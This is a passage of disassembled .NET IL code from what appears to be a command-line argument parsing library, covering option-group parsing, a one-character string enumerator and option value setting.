    IL_00fe:  ldloc.2
    IL_00ff:  ldarg.1
    IL_0100:  callvirt   instance string CommandLine.IArgumentEnumerator::get_Next()
    IL_0105:  ldarg.3
    IL_0106:  callvirt   instance bool CommandLine.OptionInfo::SetValue(string,
                                                                        object)
    IL_010b:  stloc.3
    IL_010c:  ldloc.3
    IL_010d:  brtrue     IL_0119

    IL_0112:  ldarg.0
    IL_0113:  ldloc.2
    IL_0114:  call       instance void CommandLine.ArgumentParser::DefineOptionThatViolatesFormat(class CommandLine.OptionInfo)
    IL_0119:  ldloc.3
    IL_011a:  ldc.i4.1
    IL_011b:  call       valuetype CommandLine.ParserState CommandLine.ArgumentParser::BooleanToParserState(bool,
                                                                                                            bool)
    IL_0120:  ret

    IL_0121:  ldloc.2
    IL_0122:  call       void CommandLine.ArgumentParser::EnsureOptionAttributeIsArrayCompatible(class CommandLine.OptionInfo)
    IL_0127:  ldarg.1
    IL_0128:  call       class [mscorlib]System.Collections.Generic.IList`1<string> CommandLine.ArgumentParser::GetNextInputValues(class CommandLine.IArgumentEnumerator)
    IL_012d:  stloc.s    V_5
    IL_012f:  ldloc.2
    IL_0130:  ldloc.s    V_5
    IL_0132:  ldarg.3
    IL_0133:  callvirt   instance bool CommandLine.OptionInfo::SetValue(class [mscorlib]System.Collections.Generic.IList`1<string>,
                                                                        object)
    IL_0138:  stloc.3
    IL_0139:  ldloc.3
    IL_013a:  brtrue     IL_0146

    IL_013f:  ldarg.0
    IL_0140:  ldloc.2
    IL_0141:  call       instance void CommandLine.ArgumentParser::DefineOptionThatViolatesFormat(class CommandLine.OptionInfo)
    IL_0146:  ldloc.3
    IL_0147:  ldc.i4.1
    IL_0148:  call       valuetype CommandLine.ParserState CommandLine.ArgumentParser::BooleanToParserState(bool,
                                                                                                            bool)
    IL_014d:  ret

    IL_014e:  ldloc.1
    IL_014f:  ldlen
    IL_0150:  conv.i4
    IL_0151:  ldc.i4.2
    IL_0152:  bne.un     IL_0159

    IL_0157:  ldc.i4.2
    IL_0158:  ret

    IL_0159:  ldloc.2
    IL_015a:  ldc.i4.1
    IL_015b:  ldarg.3
    IL_015c:  callvirt   instance bool CommandLine.OptionInfo::SetValue(bool,
                                                                        object)
    IL_0161:  stloc.3
    IL_0162:  ldloc.3
    IL_0163:  brtrue     IL_016f

    IL_0168:  ldarg.0
    IL_0169:  ldloc.2
    IL_016a:  call       instance void CommandLine.ArgumentParser::DefineOptionThatViolatesFormat(class CommandLine.OptionInfo)
    IL_016f:  ldloc.3
    IL_0170:  call       valuetype CommandLine.ParserState CommandLine.ArgumentParser::BooleanToParserState(bool)
    IL_0175:  ret
  } // end of method LongOptionParser::Parse

} // end of class CommandLine.LongOptionParser

.class private auto ansi sealed beforefieldinit CommandLine.OneCharStringEnumerator
       extends [mscorlib]System.Object
       implements CommandLine.IArgumentEnumerator,
                  [mscorlib]System.IDisposable
{
  .field private string _currentElement
  .field private int32 _index
  .field private initonly string _data
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string 'value') cil managed
  {
    // Code size       32 (0x20)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.1
    IL_0007:  ldstr      "value"
    IL_000c:  call       void CommandLine.Assumes::NotNullOrEmpty(string,
                                                                  string)
    IL_0011:  ldarg.0
    IL_0012:  ldarg.1
    IL_0013:  stfld      string CommandLine.OneCharStringEnumerator::_data
    IL_0018:  ldarg.0
    IL_0019:  ldc.i4.m1
    IL_001a:  stfld      int32 CommandLine.OneCharStringEnumerator::_index
    IL_001f:  ret
  } // end of method OneCharStringEnumerator::.ctor

  .method public hidebysig newslot specialname virtual final 
          instance string  get_Current() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      int32 CommandLine.OneCharStringEnumerator::_index
    IL_0006:  ldc.i4.m1
    IL_0007:  bne.un     IL_0012

    IL_000c:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor()
    IL_0011:  throw

    IL_0012:  ldarg.0
    IL_0013:  ldfld      int32 CommandLine.OneCharStringEnumerator::_index
    IL_0018:  ldarg.0
    IL_0019:  ldfld      string CommandLine.OneCharStringEnumerator::_data
    IL_001e:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0023:  blt        IL_002e

    IL_0028:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor()
    IL_002d:  throw

    IL_002e:  ldarg.0
    IL_002f:  ldfld      string CommandLine.OneCharStringEnumerator::_currentElement
    IL_0034:  ret
  } // end of method OneCharStringEnumerator::get_Current

  .method public hidebysig newslot specialname virtual final 
          instance string  get_Next() cil managed
  {
    // Code size       80 (0x50)
    .maxstack  6
    IL_0000:  ldarg.0
    IL_0001:  ldfld      int32 CommandLine.OneCharStringEnumerator::_index
    IL_0006:  ldc.i4.m1
    IL_0007:  bne.un     IL_0012

    IL_000c:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor()
    IL_0011:  throw

    IL_0012:  ldarg.0
    IL_0013:  ldfld      int32 CommandLine.OneCharStringEnumerator::_index
    IL_0018:  ldarg.0
    IL_0019:  ldfld      string CommandLine.OneCharStringEnumerator::_data
    IL_001e:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0023:  ble        IL_002e

    IL_0028:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor()
    IL_002d:  throw

    IL_002e:  ldarg.0
    IL_002f:  call       instance bool CommandLine.OneCharStringEnumerator::get_IsLast()
    IL_0034:  brfalse    IL_003b

    IL_0039:  ldnull
    IL_003a:  ret

    IL_003b:  ldarg.0
    IL_003c:  ldfld      string CommandLine.OneCharStringEnumerator::_data
    IL_0041:  ldarg.0
    IL_0042:  ldfld      int32 CommandLine.OneCharStringEnumerator::_index
    IL_0047:  ldc.i4.1
    IL_0048:  add
    IL_0049:  ldc.i4.1
    IL_004a:  callvirt   instance string [mscorlib]System.String::Substring(int32,
                                                                            int32)
    IL_004f:  ret
  } // end of method OneCharStringEnumerator::get_Next

  .method public hidebysig newslot specialname virtual final 
          instance bool  get_IsLast() cil managed
  {
    // Code size       22 (0x16)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      int32 CommandLine.OneCharStringEnumerator::_index
    IL_0006:  ldarg.0
    IL_0007:  ldfld      string CommandLine.OneCharStringEnumerator::_data
    IL_000c:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0011:  ldc.i4.1
    IL_0012:  sub
    IL_0013:  ceq
    IL_0015:  ret
  } // end of method OneCharStringEnumerator::get_IsLast

  .method public hidebysig instance void 
          Reset() cil managed
  {
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.m1
    IL_0002:  stfld      int32 CommandLine.OneCharStringEnumerator::_index
    IL_0007:  ret
  } // end of method OneCharStringEnumerator::Reset

  .method public hidebysig newslot virtual final 
          instance bool  MoveNext() cil managed
  {
    // Code size       83 (0x53)
    .maxstack  7
    IL_0000:  ldarg.0
    IL_0001:  ldfld      int32 CommandLine.OneCharStringEnumerator::_index
    IL_0006:  ldarg.0
    IL_0007:  ldfld      string CommandLine.OneCharStringEnumerator::_data
    IL_000c:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0011:  ldc.i4.1
    IL_0012:  sub
    IL_0013:  bge        IL_0040

    IL_0018:  ldarg.0
    IL_0019:  dup
    IL_001a:  ldfld      int32 CommandLine.OneCharStringEnumerator::_index
    IL_001f:  ldc.i4.1
    IL_0020:  add
    IL_0021:  stfld      int32 CommandLine.OneCharStringEnumerator::_index
    IL_0026:  ldarg.0
    IL_0027:  ldarg.0
    IL_0028:  ldfld      string CommandLine.OneCharStringEnumerator::_data
    IL_002d:  ldarg.0
    IL_002e:  ldfld      int32 CommandLine.OneCharStringEnumerator::_index
    IL_0033:  ldc.i4.1
    IL_0034:  callvirt   instance string [mscorlib]System.String::Substring(int32,
                                                                            int32)
    IL_0039:  stfld      string CommandLine.OneCharStringEnumerator::_currentElement
    IL_003e:  ldc.i4.1
    IL_003f:  ret

    IL_0040:  ldarg.0
    IL_0041:  ldarg.0
    IL_0042:  ldfld      string CommandLine.OneCharStringEnumerator::_data
    IL_0047:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_004c:  stfld      int32 CommandLine.OneCharStringEnumerator::_index
    IL_0051:  ldc.i4.0
    IL_0052:  ret
  } // end of method OneCharStringEnumerator::MoveNext

  .method public hidebysig newslot virtual final 
          instance string  GetRemainingFromNext() cil managed
  {
    // Code size       66 (0x42)
    .maxstack  5
    IL_0000:  ldarg.0
    IL_0001:  ldfld      int32 CommandLine.OneCharStringEnumerator::_index
    IL_0006:  ldc.i4.m1
    IL_0007:  bne.un     IL_0012

    IL_000c:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor()
    IL_0011:  throw

    IL_0012:  ldarg.0
    IL_0013:  ldfld      int32 CommandLine.OneCharStringEnumerator::_index
    IL_0018:  ldarg.0
    IL_0019:  ldfld      string CommandLine.OneCharStringEnumerator::_data
    IL_001e:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0023:  ble        IL_002e

    IL_0028:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor()
    IL_002d:  throw

    IL_002e:  ldarg.0
    IL_002f:  ldfld      string CommandLine.OneCharStringEnumerator::_data
    IL_0034:  ldarg.0
    IL_0035:  ldfld      int32 CommandLine.OneCharStringEnumerator::_index
    IL_003a:  ldc.i4.1
    IL_003b:  add
    IL_003c:  callvirt   instance string [mscorlib]System.String::Substring(int32)
    IL_0041:  ret
  } // end of method OneCharStringEnumerator::GetRemainingFromNext

  .method public hidebysig newslot virtual final 
          instance bool  MovePrevious() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  newobj     instance void [mscorlib]System.NotSupportedException::.ctor()
    IL_0005:  throw
  } // end of method OneCharStringEnumerator::MovePrevious

  .method private hidebysig newslot virtual final 
          instance void  System.IDisposable.Dispose() cil managed
  {
    .override [mscorlib]System.IDisposable::Dispose
    // Code size       1 (0x1)
    .maxstack  8
    IL_0000:  ret
  } // end of method OneCharStringEnumerator::System.IDisposable.Dispose

  .property instance string Current()
  {
    .get instance string CommandLine.OneCharStringEnumerator::get_Current()
  } // end of property OneCharStringEnumerator::Current
  .property instance string Next()
  {
    .get instance string CommandLine.OneCharStringEnumerator::get_Next()
  } // end of property OneCharStringEnumerator::Next
  .property instance bool IsLast()
  {
    .get instance bool CommandLine.OneCharStringEnumerator::get_IsLast()
  } // end of property OneCharStringEnumerator::IsLast
} // end of class CommandLine.OneCharStringEnumerator

.class private auto ansi sealed beforefieldinit CommandLine.OptionGroupParser
       extends CommandLine.ArgumentParser
{
  .field private initonly bool _ignoreUnkwnownArguments
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(bool ignoreUnkwnownArguments) cil managed
  {
    // Code size       14 (0xe)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void CommandLine.ArgumentParser::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.1
    IL_0008:  stfld      bool CommandLine.OptionGroupParser::_ignoreUnkwnownArguments
    IL_000d:  ret
  } // end of method OptionGroupParser::.ctor

  .method public hidebysig virtual instance valuetype CommandLine.ParserState 
          Parse(class CommandLine.IArgumentEnumerator argumentEnumerator,
                class CommandLine.OptionMap map,
                object options) cil managed
  {
    // Code size       394 (0x18a)
    .maxstack  35
    .locals init ([0] class CommandLine.IArgumentEnumerator V_0,
             [1] class CommandLine.OptionInfo V_1,
             [2] bool V_2,
             [3] class [mscorlib]System.Collections.Generic.IList`1<string> V_3,
             [4] class [mscorlib]System.Collections.Generic.IList`1<string> V_4)
    IL_0000:  ldarg.1
    IL_0001:  callvirt   instance string CommandLine.IArgumentEnumerator::get_Current()
    IL_0006:  ldc.i4.1
    IL_0007:  callvirt   instance string [mscorlib]System.String::Substring(int32)
    IL_000c:  newobj     instance void CommandLine.OneCharStringEnumerator::.ctor(string)
    IL_0011:  stloc.0
    IL_0012:  br         IL_017d

    IL_0017:  ldarg.2
    IL_0018:  ldloc.0
    IL_0019:  callvirt   instance string CommandLine.IArgumentEnumerator::get_Current()
    IL_001e:  callvirt   instance class CommandLine.OptionInfo CommandLine.OptionMap::get_Item(string)
    IL_0023:  stloc.1
    IL_0024:  ldloc.1
    IL_0025:  brtrue     IL_0039

    IL_002a:  ldarg.0
    IL_002b:  ldfld      bool CommandLine.OptionGroupParser::_ignoreUnkwnownArguments
    IL_0030:  brtrue     IL_0037

    IL_0035:  ldc.i4.2
    IL_0036:  ret

    IL_0037:  ldc.i4.4
    IL_0038:  ret

    IL_0039:  ldloc.1
    IL_003a:  ldc.i4.1
    IL_003b:  callvirt   instance void CommandLine.OptionInfo::set_IsDefined(bool)
    IL_0040:  ldloc.1
    IL_0041:  call       void CommandLine.ArgumentParser::EnsureOptionArrayAttributeIsNotBoundToScalar(class CommandLine.OptionInfo)
    IL_0046:  ldloc.1
    IL_0047:  callvirt   instance bool CommandLine.OptionInfo::get_IsBoolean()
    IL_004c:  brtrue     IL_0150

    IL_0051:  ldarg.1
    IL_0052:  callvirt   instance bool CommandLine.IArgumentEnumerator::get_IsLast()
    IL_0057:  brfalse    IL_0069

    IL_005c:  ldloc.0
    IL_005d:  callvirt   instance bool CommandLine.IArgumentEnumerator::get_IsLast()
    IL_0062:  brfalse    IL_0069

    IL_0067:  ldc.i4.2
    IL_0068:  ret

    IL_0069:  ldloc.0
    IL_006a:  callvirt   instance bool CommandLine.IArgumentEnumerator::get_IsLast()
    IL_006f:  brtrue     IL_00d9

    IL_0074:  ldloc.1
    IL_0075:  callvirt   instance bool CommandLine.OptionInfo::get_IsArray()
    IL_007a:  brtrue     IL_00a1

    IL_007f:  ldloc.1
    IL_0080:  ldloc.0
    IL_0081:  callvirt   instance string CommandLine.IArgumentEnumerator::GetRemainingFromNext()
    IL_0086:  ldarg.3
    IL_0087:  callvirt   instance bool CommandLine.OptionInfo::SetValue(string,
                                                                        object)
    IL_008c:  stloc.2
    IL_008d:  ldloc.2
    IL_008e:  brtrue     IL_009a

    IL_0093:  ldarg.0
    IL_0094:  ldloc.1
    IL_0095:  call       instance void CommandLine.ArgumentParser::DefineOptionThatViolatesFormat(class CommandLine.OptionInfo)
    IL_009a:  ldloc.2
    IL_009b:  call       valuetype CommandLine.ParserState CommandLine.ArgumentParser::BooleanToParserState(bool)
    IL_00a0:  ret

    IL_00a1:  ldloc.1
    IL_00a2:  call       void CommandLine.ArgumentParser::EnsureOptionAttributeIsArrayCompatible(class CommandLine.OptionInfo)
    IL_00a7:  ldarg.1
    IL_00a8:  call       class [mscorlib]System.Collections.Generic.IList`1<string> CommandLine.ArgumentParser::GetNextInputValues(class CommandLine.IArgumentEnumerator)
    IL_00ad:  stloc.3
    IL_00ae:  ldloc.3
    IL_00af:  ldc.i4.0
    IL_00b0:  ldloc.0
    IL_00b1:  callvirt   instance string CommandLine.IArgumentEnumerator::GetRemainingFromNext()
    IL_00b6:  callvirt   instance void class [mscorlib]System.Collections.Generic.IList`1<string>::Insert(int32,
                                                                                                          !0)
    IL_00bb:  ldloc.1
    IL_00bc:  ldloc.3
    IL_00bd:  ldarg.3
    IL_00be:  callvirt   instance bool CommandLine.OptionInfo::SetValue(class [mscorlib]System.Collections.Generic.IList`1<string>,
                                                                        object)
    IL_00c3:  stloc.2
    IL_00c4:  ldloc.2
    IL_00c5:  brtrue     IL_00d1

    IL_00ca:  ldarg.0
    IL_00cb:  ldloc.1
    IL_00cc:  call       instance void CommandLine.ArgumentParser::DefineOptionThatViolatesFormat(class CommandLine.OptionInfo)
    IL_00d1:  ldloc.2
    IL_00d2:  ldc.i4.1
    IL_00d3:  call       valuetype CommandLine.ParserState CommandLine.ArgumentParser::BooleanToParserState(bool,
                                                                                                            bool)
    IL_00d8:  ret

    IL_00d9:  ldarg.1
    IL_00da:  callvirt   instance bool CommandLine.IArgumentEnumerator::get_IsLast()
    IL_00df:  brtrue     IL_00f6

    IL_00e4:  ldarg.1
    IL_00e5:  callvirt   instance string CommandLine.IArgumentEnumerator::get_Next()
    IL_00ea:  call       bool CommandLine.ArgumentParser::IsInputValue(string)
    IL_00ef:  brtrue     IL_00f6

    IL_00f4:  ldc.i4.2
    IL_00f5:  ret

    IL_00f6:  ldloc.1
    IL_00f7:  callvirt   instance bool CommandLine.OptionInfo::get_IsArray()
    IL_00fc:  brtrue     IL_0124

    IL_0101:  ldloc.1
    IL_0102:  ldarg.1
    IL_0103:  callvirt   instance string CommandLine.IArgumentEnumerator::get_Next()
    IL_0108:  ldarg.3
    IL_0109:  callvirt   instance bool CommandLine.OptionInfo::SetValue(string,
                                                                        object)
    IL_010e:  stloc.2
    IL_010f:  ldloc.2
    IL_0110:  brtrue     IL_011c

    IL_0115:  ldarg.0
    IL_0116:  ldloc.1
    IL_0117:  call       instance void CommandLine.ArgumentParser::DefineOptionThatViolatesFormat(class CommandLine.OptionInfo)
    IL_011c:  ldloc.2
    IL_011d:  ldc.i4.1
    IL_011e:  call       valuetype CommandLine.ParserState CommandLine.ArgumentParser::BooleanToParserState(bool,
                                                                                                            bool)
    IL_0123:  ret

    IL_0124:  ldloc.1
    IL_0125:  call       void CommandLine.ArgumentParser::EnsureOptionAttributeIsArrayCompatible(class CommandLine.OptionInfo)
    IL_012a:  ldarg.1
    IL_012b:  call       class [mscorlib]System.Collections.Generic.IList`1<string> CommandLine.ArgumentParser::GetNextInputValues(class CommandLine.IArgumentEnumerator)
    IL_0130:  stloc.s    V_4
    IL_0132:  ldloc.1
    IL_0133:  ldloc.s    V_4
    IL_0135:  ldarg.3
    IL_0136:  callvirt   instance bool CommandLine.OptionInfo::SetValue(class [mscorlib]System.Collections.Generic.IList`1<string>,
                                                                        object)
    IL_013b:  stloc.2
    IL_013c:  ldloc.2
    IL_013d:  brtrue     IL_0149

    IL_0142:  ldarg.0
    IL_0143:  ldloc.1
    IL_0144:  call       instance void CommandLine.ArgumentParser::DefineOptionThatViolatesFormat(class CommandLine.OptionInfo)
    IL_0149:  ldloc.2
    IL_014a:  call       valuetype CommandLine.ParserState CommandLine.ArgumentParser::BooleanToParserState(bool)
    IL_014f:  ret

    IL_0150:  ldloc.0
    IL_0151:  callvirt   instance bool CommandLine.IArgumentEnumerator::get_IsLast()
    IL_0156:  brtrue     IL_016e

    IL_015b:  ldarg.2
    IL_015c:  ldloc.0
    IL_015d:  callvirt   instance string CommandLine.IArgumentEnumerator::get_Next()
    IL_0162:  callvirt   instance class CommandLine.OptionInfo CommandLine.OptionMap::get_Item(string)
    IL_0167:  brtrue     IL_016e

    IL_016c:  ldc.i4.2
    IL_016d:  ret

    IL_016e:  ldloc.1
    IL_016f:  ldc.i4.1
    IL_0170:  ldarg.3
    IL_0171:  callvirt   instance bool CommandLine.OptionInfo::SetValue(bool,
                                                                        object)
    IL_0176:  brtrue     IL_017d

    IL_017b:  ldc.i4.2
    IL_017c:  ret

    IL_017d:  ldloc.0
    IL_017e:  callvirt   instance bool CommandLine.IArgumentEnumerator::MoveNext()
    IL_0183:  brtrue     IL_0017

    IL_0188:  ldc.i4.1
    IL_0189:  ret
  } // end of method OptionGroupParser::Parse

} // end of class CommandLine.OptionGroupParser

.class private auto ansi sealed beforefieldinit CommandLine.OptionInfo
       extends [mscorlib]System.Object
{
  .custom instance void [mscorlib]System.Diagnostics.DebuggerDisplayAttribute::.ctor(string) = ( 01 00 2E 53 68 6F 72 74 4E 61 6D 65 20 3D 20 7B   // ...ShortName = {
                                                                                                 53 68 6F 72 74 4E 61 6D 65 7D 2C 20 4C 6F 6E 67   // ShortName}, Long
                                                                                                 4E 61 6D 65 20 3D 20 7B 4C 6F 6E 67 4E 61 6D 65   // Name = {LongName
                                                                                                 7D 00 00 )                                        // }..
  .field private initonly class CommandLine.OptionAttribute _attribute
  .field private initonly class [mscorlib]System.Reflection.PropertyInfo _property
  .field private initonly bool _required
  .field private initonly string _helpText
  .field private initonly string _shortName
  .field private initonly string _longName
  .field private initonly string _mutuallyExclusiveSet
  .field private initonly object _defaultValue
  .field private initonly bool _hasDefaultValue
  .field private initonly object _setValueLock
  .field private bool '<IsDefined>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(class CommandLine.OptionAttribute attribute,
                               class [mscorlib]System.Reflection.PropertyInfo 'property') cil managed
  {
    // Code size       165 (0xa5)
    .maxstack  17
    IL_0000:  ldarg.0
    IL_0001:  newobj     instance void [mscorlib]System.Object::.ctor()
    IL_0006:  stfld      object CommandLine.OptionInfo::_setValueLock
    IL_000b:  ldarg.0
    IL_000c:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0011:  ldarg.1
    IL_0012:  brfalse    IL_0077

    IL_0017:  ldarg.0
    IL_0018:  ldarg.1
    IL_0019:  callvirt   instance bool CommandLine.BaseOptionAttribute::get_Required()
    IL_001e:  stfld      bool CommandLine.OptionInfo::_required
    IL_0023:  ldarg.0
    IL_0024:  ldarg.1
    IL_0025:  callvirt   instance string CommandLine.BaseOptionAttribute::get_HelpText()
    IL_002a:  stfld      string CommandLine.OptionInfo::_helpText
    IL_002f:  ldarg.0
    IL_0030:  ldarg.1
    IL_0031:  callvirt   instance string CommandLine.BaseOptionAttribute::get_ShortName()
    IL_0036:  stfld      string CommandLine.OptionInfo::_shortName
    IL_003b:  ldarg.0
    IL_003c:  ldarg.1
    IL_003d:  callvirt   instance string CommandLine.BaseOptionAttribute::get_LongName()
    IL_0042:  stfld      string CommandLine.OptionInfo::_longName
    IL_0047:  ldarg.0
    IL_0048:  ldarg.1
    IL_0049:  callvirt   instance string CommandLine.OptionAttribute::get_MutuallyExclusiveSet()
    IL_004e:  stfld      string CommandLine.OptionInfo::_mutuallyExclusiveSet
    IL_0053:  ldarg.0
    IL_0054:  ldarg.1
    IL_0055:  callvirt   instance object CommandLine.BaseOptionAttribute::get_DefaultValue()
    IL_005a:  stfld      object CommandLine.OptionInfo::_defaultValue
    IL_005f:  ldarg.0
    IL_0060:  ldarg.1
    IL_0061:  callvirt   instance bool CommandLine.BaseOptionAttribute::get_HasDefaultValue()
    IL_0066:  stfld      bool CommandLine.OptionInfo::_hasDefaultValue
    IL_006b:  ldarg.0
    IL_006c:  ldarg.1
    IL_006d:  stfld      class CommandLine.OptionAttribute CommandLine.OptionInfo::_attribute
    IL_0072:  br         IL_0087

    IL_0077:  ldstr      "attribute"
    IL_007c:  ldstr      "The attribute is mandatory"
    IL_0081:  newobj     instance void [mscorlib]System.ArgumentNullException::.ctor(string,
                                                                                     string)
    IL_0086:  throw

    IL_0087:  ldarg.2
    IL_0088:  brfalse    IL_0095

    IL_008d:  ldarg.0
    IL_008e:  ldarg.2
    IL_008f:  stfld      class [mscorlib]System.Reflection.PropertyInfo CommandLine.OptionInfo::_property
    IL_0094:  ret

    IL_0095:  ldstr      "property"
    IL_009a:  ldstr      "The property is mandatory"
    IL_009f:  newobj     instance void [mscorlib]System.ArgumentNullException::.ctor(string,
                                                                                     string)
    IL_00a4:  throw
  } // end of method OptionInfo::.ctor

  .method public hidebysig static class CommandLine.OptionMap 
          CreateMap(object target,
                    class CommandLine.CommandLineParserSettings settings) cil managed
  {
    // Code size       133 (0x85)
    .maxstack  20
    .locals init ([0] class [mscorlib]System.Collections.Generic.IList`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.OptionAttribute>> V_0,
             [1] class CommandLine.OptionMap V_1,
             [2] class [mscorlib]System.Collections.Generic.IEnumerator`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.OptionAttribute>> V_2,
             [3] class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.OptionAttribute> V_3)
    IL_0000:  ldarg.0
    IL_0001:  call       class [mscorlib]System.Collections.Generic.IList`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,!!0>> CommandLine.ReflectionUtil::RetrievePropertyList<class CommandLine.OptionAttribute>(object)
    IL_0006:  stloc.0
    IL_0007:  ldloc.0
    IL_0008:  brfalse    IL_0083

    IL_000d:  ldloc.0
    IL_000e:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.ICollection`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.OptionAttribute>>::get_Count()
    IL_0013:  ldarg.1
    IL_0014:  newobj     instance void CommandLine.OptionMap::.ctor(int32,
                                                                    class CommandLine.CommandLineParserSettings)
    IL_0019:  stloc.1
    IL_001a:  ldloc.0
    IL_001b:  callvirt   instance class [mscorlib]System.Collections.Generic.IEnumerator`1<!0> class [mscorlib]System.Collections.Generic.IEnumerable`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.OptionAttribute>>::GetEnumerator()
    IL_0020:  stloc.2
    .try
    {
      IL_0021:  br         IL_0060

      IL_0026:  ldloc.2
      IL_0027:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.IEnumerator`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.OptionAttribute>>::get_Current()
      IL_002c:  stloc.3
      IL_002d:  ldloc.3
      IL_002e:  brfalse    IL_0060

      IL_0033:  ldloc.3
      IL_0034:  callvirt   instance !1 class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.OptionAttribute>::get_Right()
      IL_0039:  brfalse    IL_0060

      IL_003e:  ldloc.1
      IL_003f:  ldloc.3
      IL_0040:  callvirt   instance !1 class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.OptionAttribute>::get_Right()
      IL_0045:  callvirt   instance string CommandLine.OptionAttribute::get_UniqueName()
      IL_004a:  ldloc.3
      IL_004b:  callvirt   instance !1 class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.OptionAttribute>::get_Right()
      IL_0050:  ldloc.3
      IL_0051:  callvirt   instance !0 class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.OptionAttribute>::get_Left()
      IL_0056:  newobj     instance void CommandLine.OptionInfo::.ctor(class CommandLine.OptionAttribute,
                                                                       class [mscorlib]System.Reflection.PropertyInfo)
      IL_005b:  callvirt   instance void CommandLine.OptionMap::set_Item(string,
                                                                         class CommandLine.OptionInfo)
      IL_0060:  ldloc.2
      IL_0061:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
      IL_0066:  brtrue.s   IL_0026

      IL_0068:  leave      IL_007a

    }  // end .try
    finally
    {
      IL_006d:  ldloc.2
      IL_006e:  brfalse    IL_0079

      IL_0073:  ldloc.2
      IL_0074:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0079:  endfinally
    }  // end handler
    IL_007a:  ldloc.1
    IL_007b:  ldarg.0
    IL_007c:  callvirt   instance void CommandLine.OptionMap::set_RawOptions(object)
    IL_0081:  ldloc.1
    IL_0082:  ret

    IL_0083:  ldnull
    IL_0084:  ret
  } // end of method OptionInfo::CreateMap

  .method public hidebysig instance bool 
          SetValue(string 'value',
                   object options) cil managed
  {
    // Code size       64 (0x40)
    .maxstack  7
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class CommandLine.OptionAttribute CommandLine.OptionInfo::_attribute
    IL_0006:  isinst     CommandLine.OptionListAttribute
    IL_000b:  brfalse    IL_0019

    IL_0010:  ldarg.0
    IL_0011:  ldarg.1
    IL_0012:  ldarg.2
    IL_0013:  call       instance bool CommandLine.OptionInfo::SetValueList(string,
                                                                            object)
    IL_0018:  ret

    IL_0019:  ldarg.0
    IL_001a:  ldfld      class [mscorlib]System.Reflection.PropertyInfo CommandLine.OptionInfo::_property
    IL_001f:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Reflection.PropertyInfo::get_PropertyType()
    IL_0024:  call       bool CommandLine.ReflectionUtil::IsNullableType(class [mscorlib]System.Type)
    IL_0029:  brfalse    IL_0037

    IL_002e:  ldarg.0
    IL_002f:  ldarg.1
    IL_0030:  ldarg.2
    IL_0031:  call       instance bool CommandLine.OptionInfo::SetNullableValue(string,
                                                                                object)
    IL_0036:  ret

    IL_0037:  ldarg.0
    IL_0038:  ldarg.1
    IL_0039:  ldarg.2
    IL_003a:  call       instance bool CommandLine.OptionInfo::SetValueScalar(string,
                                                                              object)
    IL_003f:  ret
  } // end of method OptionInfo::SetValue

  .method public hidebysig instance bool 
          SetValue(class [mscorlib]System.Collections.Generic.IList`1<string> values,
                   object options) cil managed
  {
    // Code size       138 (0x8a)
    .maxstack  15
    .locals init ([0] class [mscorlib]System.Type V_0,
             [1] class [mscorlib]System.Array V_1,
             [2] int32 V_2,
             [3] object V_3,
             [4] bool V_4)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [mscorlib]System.Reflection.PropertyInfo CommandLine.OptionInfo::_property
    IL_0006:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Reflection.PropertyInfo::get_PropertyType()
    IL_000b:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Type::GetElementType()
    IL_0010:  stloc.0
    IL_0011:  ldloc.0
    IL_0012:  ldarg.1
    IL_0013:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.ICollection`1<string>::get_Count()
    IL_0018:  call       class [mscorlib]System.Array [mscorlib]System.Array::CreateInstance(class [mscorlib]System.Type,
                                                                                             int32)
    IL_001d:  stloc.1
    IL_001e:  ldc.i4.0
    IL_001f:  stloc.2
